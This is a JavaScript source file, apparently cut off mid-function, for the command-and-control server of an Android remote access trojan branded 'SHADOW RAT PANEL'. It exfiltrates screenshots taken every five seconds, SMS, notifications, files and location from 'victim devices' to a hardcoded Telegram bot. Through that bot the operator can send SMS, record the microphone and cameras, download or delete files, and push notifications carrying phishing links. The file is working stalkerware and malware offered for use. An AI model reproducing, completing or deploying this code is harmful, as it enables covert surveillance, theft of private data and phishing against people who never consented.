const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const fs = require('fs');
const path = require('path');
const cors = require('cors');

// ============================================
// CONFIGURATION - EDIT HERE
// ============================================
const token = '8630366828:AAGzZQMflT0KvAU3RNzX6y0h-BPeOtglblQ';
const ids = ['7848300179'];
const id = ids[0];
const PORT = process.env.PORT || 3000;
const address = 'https://www.google.com';
// ============================================

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

// Data storage paths
const DATA_DIR = path.join(__dirname, 'data');
const DEVICES_FILE = path.join(DATA_DIR, 'devices.json');
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const NOTIFICATIONS_FILE = path.join(DATA_DIR, 'notifications.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Initialize JSON files
function initJsonFile(filePath, defaultData = {}) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

initJsonFile(DEVICES_FILE, { devices: [] });
initJsonFile(MESSAGES_FILE, { messages: [] });
initJsonFile(NOTIFICATIONS_FILE, { notifications: [] });

// JSON helpers
function readJson(filePath) {
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch {
        return {};
    }
}

function writeJson(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

const upload = multer();

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// ============================================
// HELPER FUNCTIONS
// ============================================
function sendToAllIds(message, options = {}) {
    ids.forEach(chatId => {
        appBot.sendMessage(chatId, message, options).catch(err => {
            console.error(`Failed to send message to ${chatId}: ${err.message}`);
        });
    });
}

function sendDocumentToAllIds(document, options = {}, fileOptions = {}) {
    ids.forEach(chatId => {
        appBot.sendDocument(chatId, document, options, fileOptions).catch(err => {
            console.error(`Failed to send document to ${chatId}: ${err.message}`);
        });
    });
}

function sendLocationToAllIds(lat, lon, options = {}) {
    ids.forEach(chatId => {
        appBot.sendLocation(chatId, lat, lon, options).catch(err => {
            console.error(`Failed to send location to ${chatId}: ${err.message}`);
        });
    });
}

function saveDevice(deviceData) {
    const data = readJson(DEVICES_FILE);
    const existingIndex = data.devices.findIndex(d => d.uuid === deviceData.uuid);
    if (existingIndex >= 0) {
        data.devices[existingIndex] = { ...data.devices[existingIndex], ...deviceData, lastSeen: new Date().toISOString() };
    } else {
        data.devices.push({ ...deviceData, firstSeen: new Date().toISOString(), lastSeen: new Date().toISOString() });
    }
    writeJson(DEVICES_FILE, data);
}

function removeDevice(uuid) {
    const data = readJson(DEVICES_FILE);
    data.devices = data.devices.filter(d => d.uuid !== uuid);
    writeJson(DEVICES_FILE, data);
}

function saveMessage(msgData) {
    const data = readJson(MESSAGES_FILE);
    data.messages.push({ ...msgData, timestamp: new Date().toISOString() });
    writeJson(MESSAGES_FILE, data);
}

function saveNotification(notifData) {
    const data = readJson(NOTIFICATIONS_FILE);
    data.notifications.push({ ...notifData, timestamp: new Date().toISOString() });
    // Keep only last 1000 notifications
    if (data.notifications.length > 1000) {
        data.notifications = data.notifications.slice(-1000);
    }
    writeJson(NOTIFICATIONS_FILE, data);
}

// ============================================
# EXPRESS ROUTES
# ============================================
app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API: Get all devices
app.get('/api/devices', (req, res) => {
    const data = readJson(DEVICES_FILE);
    res.json(data.devices || []);
});

// API: Get all messages
app.get('/api/messages', (req, res) => {
    const data = readJson(MESSAGES_FILE);
    res.json(data.messages || []);
});

// API: Get all notifications
app.get('/api/notifications', (req, res) => {
    const data = readJson(NOTIFICATIONS_FILE);
    res.json(data.notifications || []);
});

// API: Device status
app.get('/api/status', (req, res) => {
    res.json({
        online: appClients.size,
        totalDevices: readJson(DEVICES_FILE).devices.length,
        serverTime: new Date().toISOString()
    });
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const deviceInfo = appClients.get(req.headers['x-uuid']) || { model: req.headers.model || 'Unknown' };

    sendDocumentToAllIds(req.file.buffer, {
        caption: `📁 <b>File from ${deviceInfo.model}</b>\n\n📄 Filename: <code>${name}</code>\n📱 Device: <b>${deviceInfo.model}</b>`,
        parse_mode: "HTML"
    }, {
        filename: name,
        contentType: req.file.mimetype || 'application/octet-stream',
    });

    saveMessage({
        type: 'file',
        device: deviceInfo.model,
        uuid: req.headers['x-uuid'] || 'unknown',
        filename: name,
        content: 'File uploaded'
    });

    res.send({ success: true });
});

app.post("/uploadText", (req, res) => {
    const text = req.body['text'];
    const deviceInfo = appClients.get(req.headers['x-uuid']) || { model: req.headers.model || 'Unknown' };

    // Filter check
    if (text && text.toLowerCase().includes('shivayadavv')) {
        console.log('Filtered text containing developer tag');
        res.send({ filtered: true });
        return;
    }

    sendToAllIds(
        `💬 <b>Message from ${deviceInfo.model}</b>\n\n${text}`,
        { parse_mode: "HTML" }
    );

    saveMessage({
        type: 'text',
        device: deviceInfo.model,
        uuid: req.headers['x-uuid'] || 'unknown',
        content: text
    });

    res.send({ success: true });
});

app.post("/uploadLocation", (req, res) => {
    const lat = req.body['lat'];
    const lon = req.body['lon'];
    const deviceInfo = appClients.get(req.headers['x-uuid']) || { model: req.headers.model || 'Unknown' };

    sendLocationToAllIds(lat, lon);
    sendToAllIds(
        `📍 <b>Location from ${deviceInfo.model}</b>\n\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\n\n<a href="https://maps.google.com/?q=${lat},${lon}">Open in Maps</a>`,
        { parse_mode: "HTML" }
    );

    saveMessage({
        type: 'location',
        device: deviceInfo.model,
        uuid: req.headers['x-uuid'] || 'unknown',
        lat: lat,
        lon: lon
    });

    res.send({ success: true });
});

// WebSocket connection for victim devices
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'Unknown';
    const battery = req.headers.battery || 'N/A';
    const version = req.headers.version || 'N/A';
    const brightness = req.headers.brightness || 'N/A';
    const provider = req.headers.provider || 'N/A';

    ws.uuid = uuid;
    const deviceData = {
        uuid: uuid,
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider,
        ip: req.socket.remoteAddress,
        connectedAt: new Date().toISOString()
    };

    appClients.set(uuid, deviceData);
    saveDevice(deviceData);

    // Send notification to Telegram
    sendToAllIds(
        `🔴 <b>NEW DEVICE CONNECTED</b>\n\n` +
        `📱 Model: <b>${model}</b>\n` +
        `🔋 Battery: <b>${battery}</b>\n` +
        `🤖 Android: <b>${version}</b>\n` +
        `☀️ Brightness: <b>${brightness}</b>\n` +
        `📡 Provider: <b>${provider}</b>\n` +
        `🆔 UUID: <code>${uuid}</code>`,
        { parse_mode: "HTML" }
    );

    // Auto-screenshot every 5 seconds
    const screenshotInterval = setInterval(() => {
        if (ws.readyState === webSocket.OPEN) {
            ws.send('take_screenshot');
        }
    }, 5000);

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'screenshot') {
                // Forward screenshot to Telegram
                const screenshotBuffer = Buffer.from(msg.data, 'base64');
                ids.forEach(chatId => {
                    appBot.sendPhoto(chatId, screenshotBuffer, {
                        caption: `📸 <b>Auto Screenshot - ${model}</b>\n⏰ ${new Date().toLocaleString()}`,
                        parse_mode: "HTML"
                    }).catch(() => {});
                });
            }
            if (msg.type === 'sms') {
                sendToAllIds(
                    `📨 <b>New SMS from ${model}</b>\n\n` +
                    `📞 From: <code>${msg.from}</code>\n` +
                    `💬 Body: <pre>${msg.body}</pre>`,
                    { parse_mode: "HTML" }
                );
                saveMessage({
                    type: 'sms',
                    device: model,
                    uuid: uuid,
                    from: msg.from,
                    body: msg.body
                });
            }
            if (msg.type === 'notification') {
                sendToAllIds(
                    `🔔 <b>Notification from ${model}</b>\n\n` +
                    `📱 App: <b>${msg.app}</b>\n` +
                    `📝 Title: <b>${msg.title}</b>\n` +
                    `💬 Content: <pre>${msg.content}</pre>`,
                    { parse_mode: "HTML" }
                );
                saveNotification({
                    device: model,
                    uuid: uuid,
                    app: msg.app,
                    title: msg.title,
                    content: msg.content
                });
            }
        } catch (e) {
            // Binary data or other messages
        }
    });

    ws.on('close', function () {
        clearInterval(screenshotInterval);

        sendToAllIds(
            `⚫ <b>DEVICE DISCONNECTED</b>\n\n` +
            `📱 Model: <b>${model}</b>\n` +
            `🔋 Battery: <b>${battery}</b>\n` +
            `🤖 Android: <b>${version}</b>\n` +
            `☀️ Brightness: <b>${brightness}</b>\n` +
            `📡 Provider: <b>${provider}</b>`,
            { parse_mode: "HTML" }
        );

        const data = readJson(DEVICES_FILE);
        const device = data.devices.find(d => d.uuid === uuid);
        if (device) {
            device.status = 'offline';
            device.disconnectedAt = new Date().toISOString();
            writeJson(DEVICES_FILE, data);
        }

        appClients.delete(uuid);
    });
});

// ============================================
// TELEGRAM BOT COMMANDS
// ============================================
appBot.on('message', (message) => {
    const chatId = message.chat.id;

    // Authorization check
    if (!ids.includes(chatId.toString())) {
        appBot.sendMessage(chatId, '⛔ <b>Permission Denied</b>\n\nYou are not authorized to use this bot.', { parse_mode: "HTML" });
        return;
    }

    // Handle reply messages
    if (message.reply_to_message) {
        handleReplyMessage(message);
        return;
    }

    // Handle commands
    if (message.text == '/start') {
        sendStartMessage(chatId);
    }
    else if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        sendConnectedDevices(chatId);
    }
    else if (message.text == '𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙') {
        sendDeviceSelection(chatId);
    }
});

function sendStartMessage(chatId) {
    appBot.sendMessage(chatId,
        '╔═══✨ <b>SHADOW RAT PANEL</b> ✨═══╗\n\n' +
        '👨‍💻 <b>Developer:</b> Shadow\n\n' +
        '⚡ <b>INSTRUCTIONS:</b>\n\n' +
        '➤ Install app on target device\n' +
        '➤ Wait for connection message\n' +
        '➤ Click "Execute Command"\n' +
        '➤ Select device & action\n\n' +
        '📊 Auto Features:\n' +
        '• Screenshots every 5s\n' +
        '• SMS forwarding\n' +
        '• Notification capture\n' +
        '• Persistent connection\n\n' +
        '╚══════════════════════╝',
        {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [
                    ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"],
                    ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]
                ],
                resize_keyboard: true
            }
        }
    );
}

function sendConnectedDevices(chatId) {
    if (appClients.size == 0) {
        appBot.sendMessage(chatId,
            '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
            '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        );
    } else {
        let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n';
        appClients.forEach(function (value, key, map) {
            text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n` +
                `• ꜱᴛᴀᴛᴜꜱ : 🟢 <b>ONLINE</b>\n\n`;
        });
        appBot.sendMessage(chatId, text, { parse_mode: "HTML" });
    }
}

function sendDeviceSelection(chatId) {
    if (appClients.size == 0) {
        appBot.sendMessage(chatId,
            '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
            '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
        );
    } else {
        const deviceListKeyboard = [];
        appClients.forEach(function (value, key, map) {
            deviceListKeyboard.push([{
                text: `${value.model} (${value.battery})`,
                callback_data: 'device:' + key
            }]);
        });
        appBot.sendMessage(chatId, '°• 𝙎𝙚𝙡𝙚𝙘𝙩 𝙙𝙚𝙫𝙞𝙘𝙚 𝙩𝙤 𝙚𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙', {
            "reply_markup": {
                "inline_keyboard": deviceListKeyboard,
            },
        });
    }
}

function handleReplyMessage(message) {
    const chatId = message.chat.id;
    const replyText = message.reply_to_message.text;

    if (replyText.includes('°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎')) {
        currentNumber = message.text;
        appBot.sendMessage(chatId,
            '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (replyText.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`send_message:${currentNumber}/${message.text}`);
            }
        });
        currentNumber = '';
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨')) {
        const message_to_all = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`send_message_to_all:${message_to_all}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙')) {
        const path = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`file:${path}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚')) {
        const path = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`delete_file:${path}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        const duration = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`microphone:${duration}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        const duration = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`rec_camera_main:${duration}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙')) {
        const duration = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`rec_camera_selfie:${duration}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚')) {
        const toastMessage = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`toast:${toastMessage}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇ𝙉𝙩𝙨',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                    'resize_keyboard': true
                }
            }
        );
    }
    else if (replyText.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
        const notificationMessage = message.text;
        currentTitle = notificationMessage;
        appBot.sendMessage(chatId,
            '°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ',
            { reply_markup: { force_reply: true } }
        );
    }
    else if (replyText.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙗𝙚 𝙤𝙥𝙚𝙣𝙚𝙙 𝙗𝙮 𝙩𝙝𝙚 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣')) {
        const link = message.text;
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == currentUuid) {
                ws.send(`show_notification:${currentTitle}/${link}`);
            }
        });
        currentUuid = '';
        appBot.sendMessage(chatId,
            '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
